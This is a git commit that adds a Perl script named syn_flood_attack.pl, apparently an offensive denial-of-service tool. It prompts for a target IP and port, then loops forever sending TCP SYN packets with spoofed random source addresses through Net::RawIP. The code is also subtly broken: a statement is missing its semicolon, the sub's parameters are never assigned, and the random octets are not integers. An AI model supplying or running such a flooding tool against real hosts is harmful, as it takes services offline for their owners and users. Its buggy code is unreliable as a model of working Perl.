94a67774b5145ebeaa927f55a1ceec56e9aa4382
Siaperas <p.siaperas@gmail.com>
2019-02-24 21:40:38 +0200

    Create syn_flood_attack.pl

---
+++ syn_flood_attack.pl
@@ -0,0 +1,54 @@
+#!/usr/bin/perl
+
+# SYN Flooding Attack
+
+use Net::RawIP;
+ 
+# Set info needed
+print "\n============================";
+print "\n[!] Enter the designated ip: "; # Set IP
+$ip = <STDIN>;
+chomp ($ip);
+while (!($ip =~ /(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/)){
+	print "\n[!] Enter the designated ip correctly: "; # Re-enter IP
+	$ip = <STDIN>;
+	chomp ($ip);
+}
+
+print "Designated IP ==> $ip";
+print "\n============================";
+print "\n[!] Enter TCP Port: "; # Set Port
+$port = <STDIN>;
+chomp ($port);
+while (not ($port =~ /^-?\d+$/ ) || ($port <= 0 || $port > 65535)){ 
+	print "\n[!] Enter a TCP port correctly: "; # Re-enter Port       
+	$port = <STDIN>;
+	chomp ($port); 
+} 
+ 
+attack($ip,$port)
+ 
+sub randomIP(){
+    return rand(255) . "." . rand(255) . "." . rand(255) . "." . rand(255);
+}
+ 
+sub attack($dest_ip, $dest_port){
+   $net_raw_ip = new Net::RawIP;
+   while(1) {
+      $source_port = int(rand(65535-1))+1;
+      $source_ip = randomIP();
+	  $net_raw_ip->set({
+                      ip  => {
+                              saddr => $source_ip,
+                              daddr => $dest_ip,
+                             },
+                      tcp => {
+                              source => $source_port,
+                              dest   => $dest_port,
+                              psh    => 1,
+                              syn    => 1,
+                             }
+                     });
+      $net_raw_ip->send;
+   }
+}
